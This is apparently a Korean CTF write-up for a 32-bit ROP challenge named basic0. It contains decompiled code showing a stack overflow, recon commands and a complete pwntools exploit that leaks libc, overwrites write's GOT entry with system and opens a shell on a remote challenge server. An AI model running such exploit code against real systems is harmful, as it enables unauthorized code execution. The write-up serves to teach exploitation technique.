# basic0
basic0는 kingepist님이 내주신 rop 문제이다. 
~~~c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char buf; // [esp+0h] [ebp-24h]

  setup();
  read(0, &buf, 256u);
  write(1, &buf, 32u);
  return 0;
}
~~~
* ida를 통해 확인한 c code
## 준비단계
* 리눅스에서 objdump 명령어를 사용하여 read의 got와 plt를 구해준다
~~~
neururaon@ubuntu:~/Documents$ objdump -d basic0 | grep -A4 "read"
080483c0 <read@plt>:
 80483c0:	ff 25 0c a0 04 08    	jmp    *0x804a00c
 80483c6:	68 00 00 00 00       	push   $0x0
 80483cb:	e9 e0 ff ff ff       	jmp    80483b0 <.plt>
~~~
* ropgadget을 사용해야 하므로 ropgadget 명령어를 사용해 pop pop pop ret의 주소를 얻어낸다
~~~
neururaon@ubuntu:~/Documents$ ROPgadget --binary basic0
~~~
* bss 영역에 read() 함수로 "/bin/sh"을 저장할 것이므로 readelf 명령어로 bss 영역 주소를 얻어낸다
~~~ubuntu
neururaon@ubuntu:~/Documents$ readelf -S basic0
~~~
* 이렇게 필요한 것은 다 알아냈다.
## exploit
* 순서
  *  0x24+0x4를 하여 0x28개의 dummy 값을 넣어줌
  * wirte() 함수로 read() 함수의 주소를 얻음
  * read() 함수로 bss 영역에 "/bin/sh"을 저장
  * read() 함수로 write()의 got에 system_addr를 저장
  * bss 영역의 값("/bin/sh")를 인자로 write_plt를 호출하여 결론적으로 system을 호출
* exploit code
~~~python
from pwn import *

r=remote("ec2-13-209-22-195.ap-northeast-2.compute.amazonaws.com",10000)


read_plt=0x80483c0
read_got=0x804a00c
write_plt=0x8048410
write_got=0x804a020
pppr=0x8048679
bss=0x804a030
libc = ELF("./libc6-i386_2.27-3ubuntu1_amd64/libc.so.6")
system_offset=libc.symbols['system']


payload='A'*0x28
payload+=p32(write_plt)
payload+=p32(pppr)
payload+=p32(1)
payload+=p32(read_got)
payload+=p32(4)

payload+=p32(read_plt)
payload+=p32(pppr)
payload+=p32(0)
payload+=p32(bss)
payload+=p32(8)
                                  
payload+=p32(read_plt)
payload+=p32(pppr)
payload+=p32(0)
payload+=p32(write_got)
payload+=p32(4)

payload+=p32(write_plt)
payload+='A'*4
payload+=p32(bss)

log.info('Exploit')
r.send(payload)
r.recv(0x20)
read_addr=u32(r.recv()[-4:])
log.info('read_addr=0x%x' %read_addr)

log.info('system_offset= 0x%x' % system_offset)
system_base=read_addr-libc.symbols['read']
log.info('system_base=0x%x' % system_base)
system_addr=system_base+ libc.symbols['system']
log.info('system_addr =0x%x' % system_addr)

r.send('/bin/sh\x00')
r.send(p32(system_addr))

r.interactive()
~~~
